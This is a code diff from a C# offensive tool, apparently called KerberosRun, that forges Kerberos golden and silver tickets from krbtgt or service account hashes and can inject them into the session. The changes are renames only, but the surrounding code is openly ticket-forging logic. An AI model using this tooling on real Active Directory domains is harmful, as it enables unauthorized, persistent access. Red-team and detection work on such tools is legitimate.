@@ -16,7 +16,7 @@ namespace KerberosRun
 
             Console.WriteLine("\n[*] Building Golden Ticket ...");
 
-            var krbtgtCred = new Utils.KerberosHashCreds("krbtgt", krbtgtHash, etype);
+            var krbtgtCred = new KerberosHashCreds("krbtgt", krbtgtHash, etype);
 
             var authData = Pac.generatePac(username, domainsid, realm, krbtgtCred.CreateKey(), now, userid);
 
@@ -79,14 +79,14 @@ namespace KerberosRun
                                 b => KrbEncTicketPart.DecodeApplication(b));
 
                 Console.WriteLine("[*] Decrypting Golden Ticket ...");
-                PrintFunc.PrintTicketEnc(de);
+                Display.PrintTicketEnc(de);
             }
 
             Console.WriteLine("[*] Now you have a Golden Ticket!");
 
 
 
-            var kirbiTGT = Kirbi.toKirbi(goldenTicket, krbtgtHash, etype, ptt, verbose);
+            var kirbiTGT = Kirbi.GetKirbi(goldenTicket, krbtgtHash, etype, ptt, verbose);
             
             Console.WriteLine("[+] Done! Now enjoy your ticket.");
 
@@ -106,7 +106,7 @@ namespace KerberosRun
 
             Console.WriteLine("\n[*] Building Sliver Ticket ...");
 
-            var srvCred = new Utils.KerberosHashCreds(srvName, srvHash, etype);
+            var srvCred = new KerberosHashCreds(srvName, srvHash, etype);
 
             var authData = Pac.generatePac(username, domainsid, realm, srvCred.CreateKey(), now);
 
@@ -178,14 +178,14 @@ namespace KerberosRun
                                 b => KrbEncTicketPart.DecodeApplication(b));
 
                 Console.WriteLine("   * [Decrypted SliverTicket Ticket]:");
-                PrintFunc.PrintTicketEnc(de);
+                Display.PrintTicketEnc(de);
             }
 
 
 
             Console.WriteLine("[*] Now you have a Sliver Ticket!");
 
-            var kirbiTGT = Kirbi.toKirbi(sliverTicket, srvName, srvHash, etype, service, ptt, verbose);
+            var kirbiTGT = Kirbi.GetKirbi(sliverTicket, srvName, srvHash, etype, service, ptt, verbose);
 
             
             Console.WriteLine("[+] Done! Now enjoy your ticket.");
